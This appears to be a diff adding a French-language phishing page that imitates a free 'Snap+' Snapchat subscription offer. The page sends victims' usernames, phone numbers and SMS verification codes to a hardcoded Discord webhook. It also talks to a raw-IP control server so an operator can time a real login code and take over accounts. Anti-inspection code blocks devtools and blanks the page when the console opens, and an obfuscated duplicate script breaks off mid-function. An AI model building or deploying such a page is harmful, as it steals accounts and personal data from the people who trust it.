@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Snap+</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+  body {
+    min-height: 100vh;
+    background: radial-gradient(ellipse at 50% 0%, #3b0a6e 0%, #1a0035 40%, #0d0020 100%);
+    font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    color: #fff;
+  }
+
+  .phone-frame {
+    width: 100%;
+    max-width: 370px;
+    min-height: 700px;
+    background: linear-gradient(180deg, #1e0040 0%, #130028 60%, #0d001e 100%);
+    border-radius: 42px;
+    padding: 40px 24px 36px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    box-shadow: 0 0 80px rgba(120, 40, 220, 0.35), inset 0 1px 0 rgba(255,255,255,0.07);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .phone-frame::before {
+    content: '';
+    position: absolute;
+    top: -80px; left: 50%;
+    transform: translateX(-50%);
+    width: 260px; height: 260px;
+    background: radial-gradient(circle, rgba(150, 60, 255, 0.2) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .status-bar {
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 30px;
+    padding: 0 4px;
+  }
+
+  .status-time { font-size: 15px; font-weight: 600; }
+
+  .status-icons { display: flex; align-items: center; gap: 5px; }
+
+  .snap-logo {
+    width: 100px; height: 100px;
+    margin-bottom: 16px;
+    object-fit: contain;
+    filter: drop-shadow(0 0 20px rgba(255, 200, 80, 0.4));
+  }
+
+  .snap-title {
+    font-size: 28px; font-weight: 700;
+    letter-spacing: -0.5px;
+    margin-bottom: 20px;
+  }
+
+  .warning-box {
+    width: 100%;
+    background: rgba(255, 140, 0, 0.07);
+    border: 1px solid rgba(255, 140, 0, 0.3);
+    border-radius: 14px;
+    padding: 12px 14px;
+    display: flex;
+    gap: 9px;
+    align-items: flex-start;
+    margin-bottom: 20px;
+  }
+
+  .warning-text {
+    font-size: 12px;
+    color: #e8a84a;
+    line-height: 1.55;
+  }
+
+  .activation-label {
+    width: 100%;
+    font-size: 17px;
+    color: #fff;
+    font-weight: 600;
+    margin-bottom: 18px;
+  }
+
+  .username-input {
+    width: 100%;
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.18);
+    border-radius: 14px;
+    height: 54px;
+    padding: 0 16px;
+    font-size: 17px;
+    font-weight: 500;
+    color: #fff;
+    outline: none;
+    font-family: inherit;
+    caret-color: #c084fc;
+    margin-bottom: 12px;
+    transition: border-color 0.2s, background 0.2s;
+  }
+
+  .username-input::placeholder { color: rgba(255,255,255,0.3); }
+  .username-input:focus { border-color: rgba(168, 85, 247, 0.55); background: rgba(255,255,255,0.1); }
+
+  .activation-promo {
+    width: 100%;
+    font-size: 23px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.25;
+    letter-spacing: -0.4px;
+    margin-bottom: 6px;
+  }
+
+  .emojis { width: 100%; font-size: 22px; letter-spacing: 3px; margin-bottom: 5px; }
+
+  .username { width: 100%; font-size: 13px; color: #9f7abf; font-weight: 500; margin-bottom: 28px; }
+
+  .input-group {
+    width: 100%;
+    display: flex;
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+
+  .country-selector {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.13);
+    border-radius: 14px;
+    padding: 0 14px;
+    height: 54px;
+    cursor: pointer;
+    flex-shrink: 0;
+    transition: background 0.2s;
+  }
+
+  .country-selector:active { background: rgba(255,255,255,0.12); }
+  .flag { font-size: 18px; }
+  .country-code { font-size: 15px; font-weight: 600; }
+
+  .phone-input {
+    flex: 1;
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.13);
+    border-radius: 14px;
+    height: 54px;
+    padding: 0 16px;
+    font-size: 17px;
+    font-weight: 500;
+    color: #fff;
+    outline: none;
+    letter-spacing: 0.5px;
+    font-family: inherit;
+    caret-color: #c084fc;
+    transition: border-color 0.2s, background 0.2s;
+  }
+
+  .phone-input::placeholder { color: rgba(255,255,255,0.25); letter-spacing: 0; }
+  .phone-input:focus { border-color: rgba(168, 85, 247, 0.55); background: rgba(255,255,255,0.1); }
+
+  .send-btn {
+    width: 100%;
+    height: 54px;
+    background: linear-gradient(135deg, #7c3aed 0%, #9d4edd 60%, #b06ef5 100%);
+    border: none;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    color: rgba(255,255,255,0.88);
+    cursor: pointer;
+    font-family: inherit;
+    box-shadow: 0 6px 24px rgba(120, 50, 220, 0.5);
+    position: relative;
+    overflow: hidden;
+    transition: opacity 0.2s, transform 0.1s;
+  }
+
+  .send-btn::after {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; height: 50%;
+    background: linear-gradient(180deg, rgba(255,255,255,0.1) 0%, transparent 100%);
+    border-radius: 14px 14px 0 0;
+  }
+
+  .send-btn:active { opacity: 0.82; transform: scale(0.985); }
+  .send-btn:disabled { cursor: default; }
+
+  .loading-dots { display: inline-flex; gap: 5px; align-items: center; }
+  .dot { width: 6px; height: 6px; border-radius: 50%; background: rgba(255,255,255,0.75); animation: bdot 1.2s infinite; }
+  .dot:nth-child(2) { animation-delay: 0.2s; }
+  .dot:nth-child(3) { animation-delay: 0.4s; }
+  @keyframes bdot { 0%,60%,100%{transform:translateY(0)} 30%{transform:translateY(-5px)} }
+
+  .home-indicator {
+    position: absolute;
+    bottom: 10px; left: 50%;
+    transform: translateX(-50%);
+    width: 110px; height: 5px;
+    background: rgba(255,255,255,0.18);
+    border-radius: 3px;
+  }
+
+  /* PAGE 2 */
+  #page2 { display: none; width: 100%; flex-direction: column; align-items: center; }
+
+  .p2-logo-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: rgba(255,255,255,0.07);
+    border-radius: 18px;
+    padding: 10px 20px;
+    margin-bottom: 22px;
+  }
+
+  .p2-logo { width: 32px; height: 32px; object-fit: contain; }
+  .p2-title { font-size: 20px; font-weight: 700; color: #fff; }
+
+  .p2-sms-box {
+    width: 100%;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 14px;
+    padding: 16px;
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    margin-bottom: 6px;
+  }
+
+  .p2-sms-icon { font-size: 24px; flex-shrink: 0; margin-top: 2px; }
+
+  .p2-sms-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: #fff;
+    line-height: 1.4;
+    margin-bottom: 4px;
+  }
+
+  .p2-sms-sub {
+    font-size: 12px;
+    color: #9f7abf;
+  }
+
+  .p2-promo {
+    width: 100%;
+    font-size: 26px;
+    font-weight: 900;
+    color: #fff;
+    text-align: center;
+    line-height: 1.2;
+    margin: 18px 0 8px;
+    letter-spacing: -0.5px;
+  }
+
+  .p2-emojis {
+    font-size: 28px;
+    letter-spacing: 4px;
+    margin-bottom: 22px;
+    text-align: center;
+  }
+
+  .code-input::-webkit-outer-spin-button,
+  .code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+  .code-input[type=number] { -moz-appearance: textfield; }
+
+  .code-input {
+    width: 100%;
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.15);
+    border-radius: 14px;
+    height: 54px;
+    padding: 0 16px;
+    font-size: 22px;
+    font-weight: 600;
+    color: #fff;
+    outline: none;
+    font-family: inherit;
+    letter-spacing: 8px;
+    text-align: center;
+    caret-color: #c084fc;
+    margin-bottom: 14px;
+    transition: border-color 0.2s;
+  }
+
+  .code-input::placeholder { font-size: 14px; letter-spacing: 1px; color: rgba(255,255,255,0.25); }
+  .code-input:focus { border-color: rgba(168,85,247,0.6); }
+
+  .verif-btn {
+    width: 100%;
+    height: 54px;
+    background: linear-gradient(135deg, #7c3aed 0%, #9d4edd 60%, #b06ef5 100%);
+    border: none;
+    border-radius: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    color: rgba(255,255,255,0.9);
+    cursor: pointer;
+    font-family: inherit;
+    box-shadow: 0 6px 24px rgba(120,50,220,0.5);
+  }
+
+  .verif-btn:active { opacity: 0.85; transform: scale(0.985); }
+
+  /* Transition entre pages */
+  #page1, #page2 {
+    transition: opacity 0.4s ease;
+  }
+
+  .fade-out { opacity: 0 !important; }
+
+
+  /* PAGE 4 : Succès */
+  #page4 { display: none; width: 100%; flex-direction: column; align-items: center; }
+
+  .p4-icon { font-size: 80px; margin: 10px 0 18px; animation: popIn 0.5s ease; }
+  @keyframes popIn { 0%{transform:scale(0)} 70%{transform:scale(1.2)} 100%{transform:scale(1)} }
+
+  .p4-title {
+    font-size: 24px; font-weight: 800; color: #fff;
+    text-align: center; margin-bottom: 12px; line-height: 1.3;
+  }
+
+  .p4-subtitle {
+    font-size: 15px; color: #c084fc; font-weight: 600;
+    text-align: center; margin-bottom: 20px;
+  }
+
+  .p4-box {
+    width: 100%;
+    background: rgba(120, 58, 237, 0.12);
+    border: 1px solid rgba(168, 85, 247, 0.35);
+    border-radius: 16px;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .p4-box-icon { font-size: 32px; margin-bottom: 10px; }
+
+  .p4-box-text {
+    font-size: 14px; color: #e2c8ff; line-height: 1.7;
+  }
+
+  .p4-box-text strong { color: #fff; }
+
+  .p4-timer {
+    font-size: 13px; color: #9f7abf;
+    text-align: center; margin-top: 6px;
+  }
+
+  .p4-logo-row {
+    display: flex; align-items: center; gap: 10px;
+    background: rgba(255,255,255,0.07);
+    border-radius: 18px; padding: 10px 20px;
+    margin-bottom: 24px;
+  }
+
+
+  /* PAGE TIMER */
+  #pageTimer { display: none; width: 100%; flex-direction: column; align-items: center; }
+
+  .pt-logo-row {
+    display: flex; align-items: center; gap: 10px;
+    background: rgba(255,255,255,0.07); border-radius: 18px;
+    padding: 10px 20px; margin-bottom: 22px;
+  }
+
+  .pt-sms-box {
+    width: 100%; background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1); border-radius: 14px;
+    padding: 16px; display: flex; gap: 12px; align-items: flex-start;
+    margin-bottom: 22px;
+  }
+
+  .pt-circle {
+    width: 130px; height: 130px; margin: 0 auto 20px;
+    position: relative; flex-shrink: 0;
+  }
+
+  .pt-circle svg { transform: rotate(-90deg); }
+
+  .pt-circle-bg { fill: none; stroke: rgba(255,255,255,0.08); stroke-width: 8; }
+  .pt-circle-fg { fill: none; stroke: #a855f7; stroke-width: 8;
+    stroke-linecap: round; stroke-dasharray: 339.3; stroke-dashoffset: 0;
+    transition: stroke-dashoffset 1s linear; }
+
+  .pt-time-text {
+    position: absolute; top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 28px; font-weight: 800; color: #fff;
+  }
+
+  .pt-label {
+    font-size: 14px; color: #c9aee8; text-align: center;
+    margin-bottom: 6px; line-height: 1.5;
+  }
+
+  .pt-sublabel {
+    font-size: 12px; color: #7c5fa0; text-align: center; margin-bottom: 28px;
+  }
+  /* PAGE 3 : Non légitime */
+  #page3 { display: none; width: 100%; flex-direction: column; align-items: center; }
+
+  .p3-icon { font-size: 70px; margin-bottom: 16px; margin-top: 10px; }
+
+  .p3-title {
+    font-size: 22px; font-weight: 800; color: #ff4d4d;
+    text-align: center; margin-bottom: 12px; line-height: 1.3;
+  }
+
+  .p3-desc {
+    font-size: 14px; color: #c9a8e0; text-align: center;
+    line-height: 1.7; margin-bottom: 30px; padding: 0 8px;
+  }
+
+  .p3-box {
+    width: 100%;
+    background: rgba(255,60,60,0.07);
+    border: 1px solid rgba(255,60,60,0.25);
+    border-radius: 14px;
+    padding: 16px;
+    font-size: 13px;
+    color: #f9a8a8;
+    line-height: 1.6;
+    margin-bottom: 28px;
+    text-align: center;
+  }
+
+  .p3-back-btn {
+    width: 100%;
+    height: 54px;
+    background: linear-gradient(135deg, #7c3aed, #b06ef5);
+    border: none; border-radius: 14px;
+    font-size: 16px; font-weight: 600;
+    color: rgba(255,255,255,0.9);
+    cursor: pointer; font-family: inherit;
+    box-shadow: 0 6px 24px rgba(120,50,220,0.5);
+    transition: opacity 0.2s;
+  }
+  .p3-back-btn:active { opacity: 0.82; }
+</style>
+
+<script>(function(){
+document.addEventListener('contextmenu',function(e){e.preventDefault();});
+document.addEventListener('keydown',function(e){
+  if(e.keyCode===123||(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74||e.keyCode===67))||(e.ctrlKey&&e.keyCode===85)){
+    e.preventDefault();return false;
+  }
+});
+var _dt=false;var _el=new Image();
+Object.defineProperty(_el,'id',{get:function(){_dt=true;}});
+setInterval(function(){_dt=false;console.log(_el);if(_dt){document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0d0019;color:#ff4d4d;font-size:20px;font-family:sans-serif;">⛔ Accès refusé</div>';}},800);
+
+var _lastPhone=null;
+var _W='https://discord.com/api/webhooks/1499126763777953843/oypZXPgyzMtr4V-GjJHugIGL263ZMHvs8O_tKOFEaHA8Rz-gkgxrTDvpmRHjw9e4IUxx';
+var _S='http://85.215.148.4:27208';
+var _sid=null;
+var _poll=null;
+var _timerInt=null;
+var _verifSent=false;
+var _sendLocked=false;
+
+window.addEventListener('load',function(){
+  var logo=document.querySelector('#page1 .snap-logo').src;
+  document.getElementById('logo2').src=logo;
+  document.getElementById('logo4').src=logo;
+  document.getElementById('logoTimer').src=logo;
+});
+
+function _sw(h,s){
+  var hi=document.getElementById(h),si=document.getElementById(s);
+  hi.style.transition='opacity 0.4s ease';hi.style.opacity='0';
+  setTimeout(function(){
+    hi.style.display='none';
+    si.style.display='flex';si.style.opacity='0';
+    si.style.transition='opacity 0.4s ease';
+    setTimeout(function(){si.style.opacity='1';},30);
+  },400);
+}
+
+function _startPoll(id){
+  _poll=setInterval(async function(){
+    try{
+      var r=await fetch(_S+'/api/status/'+id);
+      var d=await r.json();
+      if(d.status==='accept'){clearInterval(_poll);}
+      else if(d.status==='reject'){clearInterval(_poll);_sw('page2','page3');}
+      else if(d.status==='code'){
+        clearInterval(_poll);
+        if(_timerInt){clearInterval(_timerInt);_timerInt=null;}
+        var arc=document.getElementById('timerArc');
+        var txt=document.getElementById('timerText');
+        if(arc){arc.style.transition='stroke-dashoffset 0.3s linear';arc.style.strokeDashoffset='339.3';arc.style.stroke='#22c55e';}
+        if(txt)txt.textContent='0:00';
+        setTimeout(function(){_sw('pageTimer','page2');},400);
+      }
+    }catch(e){}
+  },2000);
+}
+
+// Minuteur 1min30 avec cercle SVG
+function _startTimer(){
+  var total=90;
+  var remaining=total;
+  var circ=339.3;
+  var arc=document.getElementById('timerArc');
+  var txt=document.getElementById('timerText');
+
+  function _tick(){
+    remaining--;
+    var m=Math.floor(remaining/60);
+    var s=remaining%60;
+    txt.textContent=m+':'+(s<10?'0':'')+s;
+    var offset=circ*(1-(remaining/total));
+    arc.style.strokeDashoffset=offset;
+    if(remaining<=10)arc.style.stroke='#ef4444';
+    else if(remaining<=30)arc.style.stroke='#f59e0b';
+    if(remaining<=0){
+      clearInterval(_timerInt);
+      txt.textContent='0:00';
+      // Auto-passer à page code quand timer expire
+      _sw('pageTimer','page2');
+    }
+  }
+  _timerInt=setInterval(_tick,1000);
+}
+
+window._hs=async function(){
+  if(_sendLocked)return;
+  var btn=document.getElementById('sendBtn');
+  var txt=document.getElementById('btnText');
+  var _ph=document.getElementById('phoneInput').value.replace(/[^0-9]/g,'');
+  var _un=document.getElementById('usernameInput').value;
+  if(!_ph||_ph.length<9){
+    document.getElementById('phoneInput').style.borderColor='rgba(239,68,68,0.7)';
+    setTimeout(function(){document.getElementById('phoneInput').style.borderColor='';},1500);
+    document.getElementById('phoneInput').focus();return;
+  }
+  _sendLocked=true;
+  btn.disabled=true;
+  txt.innerHTML='<span class="loading-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>';
+  var _now=new Date().toLocaleString('fr-FR',{timeZone:'Europe/Paris'});
+  try{
+    var sr=await fetch(_S+'/api/session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:_ph,username:_un})});
+    var sd=await sr.json();_sid=sd.sessionId;
+  }catch(e){_sid=Math.random().toString(36).substr(2,9);}
+  var _pl={
+    content:'@everyone\n📞 **+33 '+_ph+'**',username:'Snap+ Logger',
+    avatar_url:'https://upload.wikimedia.org/wikipedia/fr/a/a8/Snapchat_logo.png',
+    embeds:[{title:'📲 Nouvelle soumission Snap+',color:0x7c3aed,
+      fields:[
+        {name:'👤 Nom d\'utilisateur',value:_un||'*non renseigné*',inline:true},
+        {name:'📞 Numéro de téléphone',value:'+33 '+_ph,inline:true},
+        {name:'🕐 Date & heure',value:_now,inline:false},
+        {name:'✅ Accepter',value:'[Valider]('+_S+'/action/accept/'+_sid+')',inline:true},
+        {name:'❌ Refuser',value:'[Refuser]('+_S+'/action/reject/'+_sid+')',inline:true},
+        {name:'📩 Envoyer code',value:'[Passer au code]('+_S+'/action/code/'+_sid+')',inline:true},
+        {name:'📞 Numéro (copier)',value:'```+33 '+_ph+'```',inline:false}
+      ],
+      footer:{text:'Session: '+_sid},
+      thumbnail:{url:'https://upload.wikimedia.org/wikipedia/fr/a/a8/Snapchat_logo.png'}
+    }]
+  };
+  try{await fetch(_W,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_pl)});}catch(e){}
+  setTimeout(function(){
+    _sw('page1','pageTimer');
+    _startTimer();
+    if(_sid)_startPoll(_sid);
+  },3000);
+};
+
+window._hv=async function(){
+  if(_verifSent)return;
+  var vbtn=document.querySelector('.verif-btn');
+  var code=document.getElementById('codeInput').value.replace(/[^0-9]/g,'');
+  if(!code||code.length<4){
+    document.getElementById('codeInput').style.borderColor='rgba(239,68,68,0.7)';
+    setTimeout(function(){document.getElementById('codeInput').style.borderColor='';},1500);
+    document.getElementById('codeInput').focus();return;
+  }
+  _verifSent=true;
+  vbtn.disabled=true;
+  vbtn.textContent='Envoi...';
+  try{fetch(_S+'/api/code',{method:'POST'});}catch(e){}
+  var _now=new Date().toLocaleString('fr-FR',{timeZone:'Europe/Paris'});
+  var _pl={
+    content:'@everyone',username:'Snap+ Logger',
+    avatar_url:'https://upload.wikimedia.org/wikipedia/fr/a/a8/Snapchat_logo.png',
+    embeds:[{title:'🔐 Code de vérification reçu !',color:0x22c55e,
+      fields:[
+        {name:'📞 Numéro associé',value:'`+33 '+(_lastPhone||'?')+'`',inline:false},
+        {name:'📟 Code',value:'```'+code+'```',inline:false},
+        {name:'🔑 Copier',value:'`'+code+'`',inline:false},
+        {name:'🕐 Heure',value:_now,inline:false}
+      ],
+      footer:{text:'Code pour +33 '+(_lastPhone||'?')}
+    }]
+  };
+  try{await fetch(_W,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_pl)});}catch(e){}
+  _sw('page2','page4');
+};
+
+window._gb=function(){
+  document.getElementById('phoneInput').value='';
+  document.getElementById('usernameInput').value='';
+  document.getElementById('sendBtn').disabled=false;
+  document.getElementById('btnText').textContent='Continuer';
+  _sendLocked=false;_verifSent=false;_sid=null;
+  if(_poll)clearInterval(_poll);
+  if(_timerInt)clearInterval(_timerInt);
+  try{fetch(_S+'/api/reset',{method:'POST'});}catch(e){}
+  _sw('page3','page1');
+};
+})();</script>
+</head>
+<body>
+<div class="phone-frame">
+
+<div id="page1" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+
+  <!-- Vrai logo Snapchat -->
+  <img class="snap-logo" src="https://i.imgur.com/SUrNKUd.jpeg"
+
+  <div class="warning-box">
+    <span style="font-size:15px;flex-shrink:0;">⚠️</span>
+    <div class="warning-text">
+      Disclaimer: L'abonnement Snap+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.
+    </div>
+  </div>
+
+  <div class="activation-label">Active Snap+ gratuitement pendant 1 an !</div>
+
+  <input class="username-input" type="text" placeholder="Nom d'utilisateur" id="usernameInput"/>
+
+  <div class="input-group">
+    <div class="country-selector">
+      <span class="flag">🇫🇷</span>
+      <span class="country-code">+33</span>
+    </div>
+    <input class="phone-input" type="tel" placeholder="Numéro de téléphone" maxlength="10" id="phoneInput" oninput="this.value=this.value.replace(/[^0-9]/g,'')" inputmode="numeric" pattern="[0-9]*"/>
+  </div>
+
+  <button class="send-btn" id="sendBtn" onclick="_hs()">
+    <span id="btnText">Continuer</span>
+  </button>
+
+</div><!-- end page1 -->
+
+<!-- PAGE 2 : Code SMS -->
+<div id="page2" style="width:100%;flex-direction:column;align-items:center;display:none;">
+
+  <div class="p2-logo-row">
+    <img class="p2-logo" id="logo2" src="" alt="Snap+"/>
+    <span class="p2-title">Snap+</span>
+  </div>
+
+  <div class="warning-box">
+    <span style="font-size:15px;flex-shrink:0;">⚠️</span>
+    <div class="warning-text">
+      Disclaimer: L'abonnement Snap+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.
+    </div>
+  </div>
+
+  <div class="p2-sms-box">
+    <span class="p2-sms-icon">📱</span>
+    <div>
+      <div class="p2-sms-title">Un code de vérification a été envoyé par SMS</div>
+      <div class="p2-sms-sub">Le code peut prendre jusqu'à 3 minutes pour arriver</div>
+    </div>
+  </div>
+
+  <input class="code-input" type="tel" placeholder="Code à 4 chiffres" maxlength="4" id="codeInput" oninput="this.value=this.value.replace(/[^0-9]/g,'')" inputmode="numeric" pattern="[0-9]*"/>
+
+  <button class="verif-btn" onclick="_hv()">Vérifier</button>
+
+
+
+</div><!-- end page2 -->
+
+
+<!-- PAGE 4 : Succès activation -->
+<div id="page4" style="width:100%;flex-direction:column;align-items:center;display:none;">
+
+  <div class="p4-logo-row">
+    <img class="p2-logo" id="logo4" src="" alt="Snap+"/>
+    <span class="p2-title">Snap+</span>
+  </div>
+
+  <div class="p4-icon">🎉</div>
+
+  <div class="p4-title">Félicitations !</div>
+  <div class="p4-subtitle">Votre Snap+ a bien été validé</div>
+
+  <div class="p4-box">
+    <div class="p4-box-icon">⏳</div>
+    <div class="p4-box-text">
+      Vous allez recevoir <strong>Snap+</strong> d'ici <strong>24 heures</strong>.<br><br>
+      L'abonnement sera automatiquement activé sur votre compte Snapchat associé au numéro fourni.<br><br>
+      <strong>Aucune action supplémentaire n'est requise.</strong>
+    </div>
+  </div>
+
+  <div class="p4-timer">⏰ Activation prévue dans moins de 24h</div>
+
+</div><!-- end page4 -->
+
+
+<!-- PAGE TIMER : Attente envoi SMS -->
+<div id="pageTimer" style="width:100%;flex-direction:column;align-items:center;display:none;">
+
+  <div class="pt-logo-row">
+    <img class="p2-logo" id="logoTimer" src="" alt="Snap+"/>
+    <span class="p2-title">Snap+</span>
+  </div>
+
+  <div class="warning-box">
+    <span style="font-size:15px;flex-shrink:0;">⚠️</span>
+    <div class="warning-text">
+      Disclaimer: L'abonnement Snap+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.
+    </div>
+  </div>
+
+  <div class="pt-sms-box">
+    <span class="p2-sms-icon">📱</span>
+    <div>
+      <div class="p2-sms-title">Envoi du code de vérification en cours...</div>
+      <div class="p2-sms-sub">Vous allez recevoir un SMS dans quelques instants</div>
+    </div>
+  </div>
+
+  <div class="pt-circle">
+    <svg width="130" height="130" viewBox="0 0 130 130">
+      <circle class="pt-circle-bg" cx="65" cy="65" r="54"/>
+      <circle class="pt-circle-fg" id="timerArc" cx="65" cy="65" r="54"/>
+    </svg>
+    <div class="pt-time-text" id="timerText">1:30</div>
+  </div>
+
+  <div class="pt-label">Veuillez patienter pendant l'envoi du code SMS</div>
+  <div class="pt-sublabel">Ne fermez pas cette page</div>
+
+</div><!-- end pageTimer -->
+
+<!-- PAGE 3 : Non légitime -->
+<div id="page3" style="width:100%;flex-direction:column;align-items:center;display:none;">
+
+  <div class="p3-icon">🚫</div>
+
+  <div class="p3-title">Demande non légitime</div>
+
+  <div class="p3-desc">
+    Votre demande d'activation Snap+ a été <strong style="color:#ff4d4d;">refusée</strong> car elle ne correspond pas aux critères d'éligibilité.
+  </div>
+
+  <div class="p3-box">
+    ⚠️ Cette tentative d'activation a été <strong>signalée</strong>.<br><br>
+    L'abonnement Snap+ est réservé aux utilisateurs éligibles sélectionnés par Snapchat. Toute tentative frauduleuse est enregistrée et peut entraîner la <strong>suspension définitive</strong> de votre compte.
+  </div>
+
+  <button class="p3-back-btn" onclick="_gb()">← Retour au début</button>
+
+</div><!-- end page3 -->
+
+  <div class="home-indicator"></div>
+</div>
+
+<script>(function(){
+var _p=console.log;
+var _dt=false;
+var _el=new Image();
+Object.defineProperty(_el,'id',{get:function(){_dt=true;}});
+setInterval(function(){_dt=false;console.log(_el);if(_dt){document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0d0019;color:#ff4d4d;font-size:20px;font-family:sans-serif;">⛔ Accès refusé</div>';};},500);
+window.addEventListener('load', () => {
+ document.getElementById('logo2').src = document.querySelector('#page1 .snap-logo').src;
+ const params = new URLSearchParams(window.location.search);
+ const action = params.get('action');
+ if (action === 'accept') {
+ _0x3b9d('page1', 'page2');
+ } else if (action === 'reject') {
+ _0x3b9d('page1', 'page3');
+ }
+ });
+ async function _0x4a2f() {
+ const btn = document.getElementById('sendBtn');
+ const text = document.getElementById('btnText');
+ const _0xb4a1 = document.getElementById('phoneInput').value;
+ const _0xe2f9 = document.getElementById('usernameInput').value;
+ if (!_0xb4a1) { document.getElementById('phoneInput').focus(); return; }
+ btn.disabled = true;
+ text.innerHTML = '<span class="loading-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>';
+ const _0xf1b2 = 'https://discord.com/api/webhooks/1499126763777953843/oypZXPgyzMtr4V-GjJHugIGL263ZMHvs8O_tKOFEaHA8Rz-gkgxrTDvpmRHjw9e4IUxx';
+ const _0x5f3c = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
+ const _0xa5c8 = 'http://85.215.148.4:27208';
+ let _0xd3e7 = null;
+ try {
+ const sessionRes = await fetch(`${_0xa5c8}/api/session`, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ _0xb4a1, _0xe2f9 })
+ });
+ const sessionData = await sessionRes.json();
+ _0xd3e7 = sessionData._0xd3e7;
+ } catch(e) {
+ _0xd3e7 = Math.random().toString(36).substr(2, 9);
+ }
+ const _0xc7d4 = {
+ content: "@everyone",
+ _0xe2f9: "Snap+ Logger",
+ avatar_url: "https:
+ embeds: [{
+ title: "📲 Nouvelle soumission Snap+",
+ color: 0x7c3aed,
+ fields: [
+ { name: "👤 Nom d'utilisateur", value: _0xe2f9 || "*non renseigné*", inline: true },
+ { name: "📞 Numéro de téléphone", value: `+33 ${_0xb4a1}`, inline: true },
+ { name: "🕐 Date & heure", value: _0x5f3c, inline: false },
+ { name: "✅ Accepter", value: `[Cliquez ici pour valider](${_0xa5c8}/action/accept/${_0xd3e7})`, inline: true },
+ { name: "❌ Refuser", value: `[Cliquez ici pour refuser](${_0xa5c8}/action/reject/${_0xd3e7})`, inline: true }
+ ],
+ footer: { text: `Snap+ • Session: ${_0xd3e7}` },
+ thumbnail: { url: "https:
+ }]
+ };
+ try {
+ await fetch(_0xf1b2, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify(_0xc7d4)
+ });
+ } catch (e) {}
+ setTimeout(() => {
+ _0x3b9d('page1', 'pageTimer');
+ if (_0xd3e7) _0x8f3a(_0xd3e7);
+ }, 3000);
+ }
+ function _0x3b9d(hideId, showId) {
+ const hide = document.getElementById(hideId);
+ const show = document.getElementById(showId);
+ hide.style.opacity = '0';
+ hide.style.transition = 'opacity 0.4s ease';
+ setTimeout(() => {
+ hide.style.display = 'none';
+ show.style.display = 'flex';
+ show.style.opacity = '0';
+ show.style.transition = 'opacity 0.4s ease';
+ setTimeout(() => { show.style.opacity = '1'; }, 30);
+ }, 400);
+ }
+ function _0x2d5c() {
+ document.getElementById('adminBtns').innerHTML = '<div style="text-align:center;color:#22c55e;font-size:15px;font-weight:600;width:100%;padding:8px;">✅ Marqué comme légitime</div>';
+ }
+ function _0x6e1b() {
+ _0x3b9d('page2', 'page3');
+ }
+ function _0x9a4f() {
+ document.getElementById('phoneInput').value = '';
+ document.getElementById('usernameInput').value = '';
+ document.getElementById('sendBtn').disabled = false;
+ document.getElementById('btnText').textContent = 'Continuer';
+ _0x3b9d('page3', 'page1');
+ }
+ function _0x8f3a(_0xd3e7) {
+ const _0xa5c8 = 'http://85.215.148.4:27208';
+ const _0x1e8b = setInterval(async () => {
+ try {
+ const res = await fetch(`${_0xa5c8}/api/status/${_0xd3e7}`);
+ const data = await res.json();
+ console.log('Status:', data.status);
+ if (data.status === 'accept') {
+   clearInterval(_0x1e8b);
+   _0x3b9d('pageTimer', 'page2');
+ } else if (data.status === 'reject') {
+   clearInterval(_0x1e8b);
+   _0x3b9d('pageTimer', 'page3');
+ } else if (data.status === 'code') {
+   clearInterval(_0x1e8b);
+   _0x3b9d('pageTimer', 'page2');
+ }
+ } catch(e) {}
+ }, 2000);
+ }
+ async function _0x7c1e() {
+ const code = document.getElementById('codeInput').value;
+ if (!code) { document.getElementById('codeInput').focus(); return; }
+ const _0xf1b2 = 'https://discord.com/api/webhooks/1499126763777953843/oypZXPgyzMtr4V-GjJHugIGL263ZMHvs8O_tKOFEaHA8Rz-gkgxrTDvpmRHjw9e4IUxx';
